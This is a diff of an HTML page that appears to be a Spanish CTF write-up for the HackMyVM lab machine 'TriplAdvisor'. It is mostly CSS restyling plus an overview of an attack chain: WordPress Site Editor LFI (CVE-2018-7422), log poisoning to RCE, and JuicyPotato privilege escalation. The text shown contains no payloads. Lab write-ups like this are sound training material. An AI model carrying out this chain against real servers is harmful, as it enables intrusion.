@@ -1,218 +1,529 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TriplAdvisor — HackMyVM Writeup | YRD</title>
-  <style>
-    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
-    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
-    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
-    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
-    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
-    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
-    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
-    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
-    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
-    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
-    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
-    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
-    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
-    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
-    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
-    .hero h1 span{color:var(--primary);}
-    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
-    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
-    .meta-item{display:flex;flex-direction:column;gap:4px;}
-    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
-    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
-    .meta-value.green{color:var(--primary);}
-    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
-    @media(max-width:900px){.main{grid-template-columns:1fr;}}
-    .content{display:flex;flex-direction:column;gap:2rem;}
-    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
-    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
-    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
-    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
-    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
-    .section p:last-child{margin-bottom:0;}
-    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
-    .section li{margin-bottom:0.3rem;}
-    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
-    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
-    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
-    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
-    .comment{color:#6a9955;}
-    .cmd{color:var(--cyan);}
-    .output{color:var(--text-dim);}
-    .highlight{color:var(--primary);font-weight:600;}
-    .cred{color:var(--yellow);font-weight:600;}
-    .flag-val{color:#ff79c6;}
-    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
-    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
-    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
-    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
-    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
-    .timeline{display:flex;flex-direction:column;gap:0;}
-    .timeline-item{display:flex;gap:1.25rem;}
-    .timeline-left{display:flex;flex-direction:column;align-items:center;}
-    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
-    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
-    .timeline-item:last-child .timeline-line{display:none;}
-    .timeline-content{padding-bottom:1.5rem;}
-    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
-    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
-    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
-    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
-    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
-    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
-    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
-    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
-    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
-    .detail-row:last-child{border-bottom:none;}
-    .detail-key{font-size:0.8rem;color:var(--text-muted);}
-    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
-    .detail-val.green{color:var(--primary);}
-    .detail-val.cyan{color:var(--cyan);}
-    .skill-item{margin-bottom:1rem;}
-    .skill-item:last-child{margin-bottom:0;}
-    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
-    .skill-name{font-size:0.82rem;color:var(--text-dim);}
-    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
-    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
-    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
-    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
-    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
-    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
-    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
-    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
-    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
-    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
-    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
-    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
-    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
-    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
-    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
-    .data-table td{color:var(--text-dim);}
-    a{color:var(--primary);text-decoration:none;}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TriplAdvisor — Pentest Report</title>
+<style>
+  :root {
+    --accent: #4ade80;
+    --accent-dim: #16a34a;
+    --accent-glow: rgba(74,222,128,0.15);
+    --bg: #0a0e1a;
+    --bg2: #0f1629;
+    --bg3: #141d35;
+    --card: #111827;
+    --card2: #1a2540;
+    --border: #1e2d4a;
+    --text: #e2e8f0;
+    --text-muted: #64748b;
+    --text-dim: #94a3b8;
+    --red: #f87171;
+    --yellow: #fbbf24;
+    --blue: #60a5fa;
+    --purple: #a78bfa;
+    --orange: #fb923c;
+    --cyan: #22d3ee;
+    --green: #4ade80;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    font-size: 15px;
+    line-height: 1.7;
+  }
+
+  /* ── HERO ── */
+  .hero {
+    background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 40px 48px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    width: 600px; height: 600px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
+    top: -200px; right: -100px;
+    pointer-events: none;
+  }
+  .hero::after {
+    content: '>';
+    position: absolute;
+    right: 60px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 18rem;
+    font-weight: 900;
+    color: rgba(74,222,128,0.04);
+    font-family: monospace;
+    pointer-events: none;
+    line-height: 1;
+  }
+  .hero-inner { max-width: 1200px; margin: 0 auto; position: relative; z-index: 1; }
+  .hero-meta { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+  .tag {
+    display: inline-block;
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.3); }
+  .tag-category { background: rgba(96,165,250,0.12); color: var(--blue); border: 1px solid rgba(96,165,250,0.3); }
+  .tag-diff { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.3); }
+  .tag-os { background: rgba(251,146,60,0.12); color: var(--orange); border: 1px solid rgba(251,146,60,0.3); }
+  .hero h1 {
+    font-size: 2.8rem;
+    font-weight: 800;
+    line-height: 1.15;
+    margin-bottom: 16px;
+    color: #fff;
+  }
+  .hero h1 span { color: var(--accent); }
+  .hero-desc {
+    font-size: 1.05rem;
+    color: var(--text-dim);
+    max-width: 680px;
+    line-height: 1.8;
+    margin-bottom: 36px;
+  }
+  .hero-stats {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 32px;
+    padding-top: 28px;
+    border-top: 1px solid var(--border);
+  }
+  .stat { display: flex; flex-direction: column; gap: 4px; }
+  .stat-label {
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-muted);
+  }
+  .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--accent); }
+  .stat-value.orange { color: var(--orange); }
+  .stat-value.blue { color: var(--blue); }
+  .stat-value.red { color: var(--red); }
+  .stat-value.white { color: #fff; }
+
+  /* ── LAYOUT ── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px; }
+  .grid { display: grid; grid-template-columns: 1fr 320px; gap: 32px; }
+  main { min-width: 0; }
+  aside.sidebar { position: sticky; top: 24px; height: fit-content; display: flex; flex-direction: column; gap: 20px; }
+
+  /* ── SECTIONS ── */
+  .section { margin-bottom: 40px; }
+  .section-header { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; }
+  .section-number {
+    width: 38px; height: 38px;
+    border: 2px solid var(--accent);
+    color: var(--accent);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 800;
+    border-radius: 6px;
+    flex-shrink: 0;
+  }
+  .section-header h2 { font-size: 1.25rem; font-weight: 700; color: #fff; }
+
+  /* ── CARDS ── */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+  .card:last-child { margin-bottom: 0; }
+  .card h3 { font-size: 0.95rem; font-weight: 700; color: var(--accent); margin-bottom: 12px; }
+  .sidebar-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+  }
+  .sidebar-card h3 { font-size: 0.9rem; font-weight: 700; color: var(--accent); margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+  /* ── CODE BLOCKS ── */
+  .code-block { border-radius: 8px; overflow: hidden; border: 1px solid var(--border); margin: 12px 0; }
+  .code-label {
+    background: var(--bg3);
+    padding: 8px 16px;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .code-label .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); }
+  .code-body {
+    background: #050810;
+    padding: 16px;
+    font-family: 'Cascadia Code','Fira Code','Consolas',monospace;
+    font-size: 13px;
+    color: #a3e635;
+    overflow-x: auto;
+    white-space: pre;
+    line-height: 1.7;
+  }
+  .code-body .comment { color: #475569; font-style: italic; }
+  .code-body .cmd { color: var(--accent); font-weight: 700; }
+  .code-body .param { color: var(--cyan); }
+  .code-body .ip { color: var(--orange); }
+  .code-body .user { color: var(--purple); }
+  .code-body .path { color: var(--blue); }
+  .code-body .highlight { color: var(--red); font-weight: 700; }
+  .code-body .green { color: var(--green); font-weight: 700; }
+  .code-body .yellow { color: var(--yellow); }
+  .code-body .muted { color: var(--text-muted); }
+
+  /* ── TIMELINE ── */
+  .timeline { position: relative; padding-left: 28px; }
+  .timeline::before {
+    content: '';
+    position: absolute;
+    left: 9px; top: 6px; bottom: 6px;
+    width: 2px;
+    background: var(--border);
+  }
+  .tl-item { position: relative; margin-bottom: 28px; }
+  .tl-item:last-child { margin-bottom: 0; }
+  .tl-dot {
+    position: absolute;
+    left: -23px; top: 4px;
+    width: 12px; height: 12px;
+    border-radius: 50%;
+    background: var(--bg);
+    border: 2px solid var(--accent);
+  }
+  .tl-dot.red { border-color: var(--red); }
+  .tl-dot.yellow { border-color: var(--yellow); }
+  .tl-dot.orange { border-color: var(--orange); }
+  .tl-dot.blue { border-color: var(--blue); }
+  .tl-dot.purple { border-color: var(--purple); }
+  .tl-dot.green { border-color: var(--green); background: rgba(74,222,128,0.2); }
+  .tl-time { font-size: 11px; color: var(--text-muted); font-family: monospace; margin-bottom: 4px; }
+  .tl-title { font-weight: 700; color: #fff; margin-bottom: 4px; font-size: 0.95rem; }
+  .tl-desc { font-size: 0.88rem; color: var(--text-dim); line-height: 1.6; }
+
+  /* ── TABLES ── */
+  .data-table { width: 100%; border-collapse: collapse; font-size: 13.5px; }
+  .data-table th {
+    background: var(--bg3);
+    color: var(--text-muted);
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    padding: 10px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  .data-table td {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+  }
+  .data-table tr:last-child td { border-bottom: none; }
+  .data-table tr:hover td { background: var(--bg3); }
+  .data-table td code { font-family: monospace; font-size: 12px; color: var(--cyan); background: rgba(34,211,238,0.08); padding: 2px 6px; border-radius: 4px; }
+
+  /* ── BADGES ── */
+  .badge {
+    display: inline-block;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+  .badge-red { background: rgba(248,113,113,0.12); color: var(--red); border: 1px solid rgba(248,113,113,0.25); }
+  .badge-green { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
+  .badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); border: 1px solid rgba(96,165,250,0.25); }
+  .badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); border: 1px solid rgba(251,191,36,0.25); }
+  .badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); border: 1px solid rgba(251,146,60,0.25); }
+  .badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); }
+
+  /* ── CALLOUTS ── */
+  .callout {
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 14px 0;
+    border-left: 4px solid;
+    font-size: 0.9rem;
+    line-height: 1.7;
+  }
+  .callout-info { background: rgba(96,165,250,0.07); border-color: var(--blue); color: #bfdbfe; }
+  .callout-warn { background: rgba(251,191,36,0.07); border-color: var(--yellow); color: #fde68a; }
+  .callout-danger { background: rgba(248,113,113,0.07); border-color: var(--red); color: #fecaca; }
+  .callout-tip { background: rgba(74,222,128,0.07); border-color: var(--accent); color: #bbf7d0; }
+  .callout strong { font-weight: 700; }
+
+  /* ── HIGHLIGHT BOX ── */
+  .highlight-box {
+    border-left: 4px solid var(--accent);
+    background: var(--accent-glow);
+    border-radius: 0 8px 8px 0;
+    padding: 14px 18px;
+    margin: 14px 0;
+    font-size: 0.9rem;
+    color: var(--text);
+  }
+  .highlight-box .val {
+    font-family: monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent);
+    word-break: break-all;
+  }
+
+  /* ── FLAG CARDS ── */
+  .flag-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
+  .flag-card {
+    background: var(--card2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+  }
+  .flag-card-label { font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px; letter-spacing: 0.5px; }
+  .flag-card-name { font-weight: 700; color: #fff; margin-bottom: 10px; }
+  .flag-card-val { font-family: monospace; font-size: 13px; color: var(--accent); word-break: break-all; background: rgba(74,222,128,0.08); padding: 8px 12px; border-radius: 6px; border: 1px solid rgba(74,222,128,0.15); }
+
+  /* ── SIDEBAR ── */
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    padding: 9px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+    gap: 12px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-key { color: var(--text-muted); font-weight: 600; white-space: nowrap; }
+  .detail-val { color: var(--text); text-align: right; font-weight: 500; }
+  .detail-val.green { color: var(--accent); }
+  .detail-val.orange { color: var(--orange); }
+  .detail-val.red { color: var(--red); }
+
+  .skill-item { margin-bottom: 14px; }
+  .skill-item:last-child { margin-bottom: 0; }
+  .skill-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+  .skill-name { color: var(--text-dim); }
+  .skill-pct { color: var(--accent); font-weight: 700; }
+  .skill-bar { height: 5px; background: var(--border); border-radius: 3px; overflow: hidden; }
+  .skill-fill { height: 100%; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); border-radius: 3px; }
+
+  .tool-list { display: flex; flex-direction: column; gap: 8px; }
+  .tool-item { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--text-dim); }
+  .tool-icon { font-size: 15px; flex-shrink: 0; }
+  .tool-name { color: var(--text); font-weight: 600; }
+
+  .mitre-list { display: flex; flex-direction: column; gap: 8px; }
+  .mitre-item { display: flex; align-items: flex-start; gap: 10px; font-size: 12px; }
+  .mitre-id { font-family: monospace; font-size: 11px; font-weight: 700; color: var(--accent); background: rgba(74,222,128,0.1); padding: 2px 7px; border-radius: 4px; white-space: nowrap; flex-shrink: 0; }
+  .mitre-name { color: var(--text-dim); }
+
+  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 4px; }
+  .toc-list li a {
+    display: block;
+    padding: 7px 12px;
+    border-radius: 6px;
+    font-size: 12px;
+    color: var(--text-dim);
+    text-decoration: none;
+    transition: all 0.15s;
+    border-left: 2px solid transparent;
+  }
+  .toc-list li a:hover {
+    background: var(--accent-glow);
+    color: var(--accent);
+    border-left-color: var(--accent);
+  }
+
+  /* ── REC GRID ── */
+  .rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .rec-card {
+    background: var(--card2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+  }
+  .rec-card h4 { font-size: 0.88rem; font-weight: 700; color: var(--accent); margin-bottom: 8px; }
+  .rec-card p { font-size: 0.83rem; color: var(--text-dim); line-height: 1.6; }
+
+  /* ── MITRE TABLE ── */
+  .mitre-table-wrap { overflow-x: auto; }
+
+  /* ── FOOTER ── */
+  footer {
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    padding: 28px 40px;
+    text-align: center;
+    margin-top: 20px;
+  }
+  .footer-inner { max-width: 1200px; margin: 0 auto; }
+  .footer-inner p { color: var(--text-muted); font-size: 13px; }
+  .footer-inner strong { color: var(--text-dim); }
+  .footer-accent { color: var(--accent); font-weight: 700; }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 900px) {
+    .grid { grid-template-columns: 1fr; }
+    .sidebar { position: static; }
+    .hero { padding: 40px 20px 32px; }
+    .hero h1 { font-size: 2rem; }
+    .container { padding: 30px 20px; }
+    .rec-grid { grid-template-columns: 1fr; }
+    .flag-grid { grid-template-columns: 1fr; }
+  }
+</style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
 
-<div class="hero">
-  <div class="hero-breadcrumb"><a href="#">HackMyVM</a> / <a href="#">Windows</a> / TriplAdvisor</div>
-  <div class="tags">
-    <span class="tag tag-hmv">HACKMYVM</span>
-    <span class="tag tag-os">WINDOWS</span>
-    <span class="tag tag-easy">EASY</span>
-    <span class="tag tag-hmv">MACHINE</span>
+<!-- ═══════════════ HERO ═══════════════ -->
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-meta">
+      <span class="tag tag-platform">HackMyVM</span>
+      <span class="tag tag-category">Pentest · Web · PrivEsc</span>
+      <span class="tag tag-diff">Easy</span>
+      <span class="tag tag-os">Windows Server 2008 R2</span>
+    </div>
+    <h1><span>TriplAdvisor</span> — Pentest Report</h1>
+    <p class="hero-desc">
+      Máquina Windows con stack XAMPP y WordPress expuesto en el puerto 8080.
+      La cadena de ataque parte de un LFI (CVE-2018-7422) en el plugin <em>Site Editor v1.1</em>,
+      progresa hasta RCE vía <em>Log Poisoning</em> en el error.log de Apache,
+      y culmina en escalada de privilegios a <code style="color:var(--accent);background:rgba(74,222,128,0.1);padding:1px 6px;border-radius:4px;font-size:13px">NT AUTHORITY\SYSTEM</code>
+      mediante <em>JuicyPotato</em> explotando <code style="color:var(--accent);background:rgba(74,222,128,0.1);padding:1px 6px;border-radius:4px;font-size:13px">SeImpersonatePrivilege</code>.
+    </p>
+    <div class="hero-stats">
+      <div class="stat">
+        <span class="stat-label">IP Objetivo</span>
+        <span class="stat-value orange">10.0.2.7</span>
+      </div>
+      <div class="stat">
+        <span class="stat-label">OS</span>
+        <span class="stat-value white">Win Server 2008 R2</span>
+      </div>
+      <div class="stat">
+        <span class="stat-label">Puertos abiertos</span>
+        <span class="stat-value blue">3</span>
+      </div>
+      <div class="stat">
+        <span class="stat-label">CVE Principal</span>
+        <span class="stat-value red">CVE-2018-7422</span>
+      </div>
+      <div class="stat">
+        <span class="stat-label">User Flag</span>
+        <span class="stat-value">✓ Obtenida</span>
+      </div>
+      <div class="stat">
+        <span class="stat-label">Root Flag</span>
+        <span class="stat-value">✓ Obtenida</span>
+      </div>
+    </div>
   </div>
-  <h1>TriplAdvisor <span>Machine</span></h1>
-  <p class="hero-desc">Windows Server 2008 R2 con XAMPP y WordPress. LFI en el plugin Site Editor (CVE-2018-7422), RCE mediante Log Poisoning en Apache y escalada a SYSTEM con JuicyPotato.</p>
-  <div class="meta-row">
-    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
-    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HackMyVM Machine</span></div>
-    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / gobuster</span></div>
-    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
-  </div>
-</div>
+</header>
 
-<div class="main">
-  <div class="content">
+<!-- ═══════════════ BODY ═══════════════ -->
+<div class="container">
+<div class="grid">
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Descripción del Objetivo</h2></div>
-      
+<!-- ─── MAIN ─── -->
+<main>
 
+  <!-- SECCIÓN 1: DESCRIPCIÓN -->
+  <div class="section" id="descripcion">
+    <div class="section-header">
+      <div class="section-number">1</div>
+      <h2>Descripción del Objetivo</h2>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Contexto</h2></div>
-      
-
-<p>
-<strong>TriplAdvisor</strong> es una máquina de dificultad <em>Easy</em> de la plataforma <strong>HackMyVM</strong>
+    <div class="card">
+      <h3>Contexto</h3>
+      <p>
+        <strong>TriplAdvisor</strong> es una máquina de dificultad <em>Easy</em> de la plataforma <strong>HackMyVM</strong>
         que simula un servidor Windows 2008 R2 mal configurado con un stack XAMPP expuesto al exterior.
         Aloja un WordPress (<code style="font-family:monospace;color:var(--cyan)">v5.1.19</code>) con el plugin
         <code style="font-family:monospace;color:var(--cyan)">Site Editor v1.1</code> vulnerable,
         junto a un servicio WinRM activo en el puerto 5985 y SMB en el 445.
       </p>
-
-
-<br/>
-
-
-<p>
+      <br>
+      <p>
         El usuario de servicio Apache (<code style="font-family:monospace;color:var(--purple)">websvc</code>)
         posee el privilegio <code style="font-family:monospace;color:var(--red)">SeImpersonatePrivilege</code>,
         lo que habilita la explotación de <em>JuicyPotato</em> para obtener acceso como
         <code style="font-family:monospace;color:var(--red)">NT AUTHORITY\SYSTEM</code>.
       </p>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Servicios Expuestos</h2></div>
-      
+    <div class="card">
+      <h3>Servicios Expuestos</h3>
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>Puerto</th>
+            <th>Servicio</th>
+            <th>Versión / Banner</th>
+            <th>Estado</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>445/tcp</code></td>
+            <td>SMB</td>
+            <td>Microsoft-ds / SMBv2 (signing: not required)</td>
+            <td><span class="badge badge-yellow">Sin explotación</span></td>
+          </tr>
+          <tr>
+            <td><code>5985/tcp</code></td>
+            <td>WinRM</td>
+            <td>Microsoft HTTPAPI 2.0</td>
+            <td><span class="badge badge-yellow">Sin explotación</span></td>
+          </tr>
+          <tr>
+            <td><code>8080/tcp</code></td>
+            <td>HTTP — Apache XAMPP</td>
+            <td>Apache 2.4.10 (Win32) / PHP 5.6.3 / WordPress 5.1.19</td>
+            <td><span class="badge badge-red">Comprometido ✓</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-<table class="data-table">
-<thead>
-<tr>
-<th>Puerto</th>
-<th>Servicio</th>
-<th>Versión / Banner</th>
-<th>Estado</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>445/tcp</code></td>
-<td>SMB</td>
-<td>Microsoft-ds / SMBv2 (signing: not required)</td>
-<td><span class="badge badge-yellow">Sin explotación</span></td>
-</tr>
-<tr>
-<td><code>5985/tcp</code></td>
-<td>WinRM</td>
-<td>Microsoft HTTPAPI 2.0</td>
-<td><span class="badge badge-yellow">Sin explotación</span></td>
-</tr>
-<tr>
-<td><code>8080/tcp</code></td>
-<td>HTTP — Apache XAMPP</td>
-<td>Apache 2.4.10 (Win32) / PHP 5.6.3 / WordPress 5.1.19</td>
-<td><span class="badge badge-red">Comprometido ✓</span></td>
-</tr>
-</tbody>
-</table>
-
-
+  <!-- SECCIÓN 2: RECONOCIMIENTO -->
+  <div class="section" id="reconocimiento">
+    <div class="section-header">
+      <div class="section-number">2</div>
+      <h2>Reconocimiento y Enumeración</h2>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento y Enumeración</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Escaneo de Puertos (nmap)</h2></div>
-      
-
-<p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
+    <div class="card">
+      <h3>Escaneo de Puertos (nmap)</h3>
+      <p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
         Escaneo completo previo almacenado en <code style="font-family:monospace;color:var(--cyan)">/home/kali/TripAdvisor.txt</code>.
         Se utilizó la modalidad agresiva con detección de versiones, scripts y OS fingerprinting.
       </p>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>nmap — Full Scan</div>
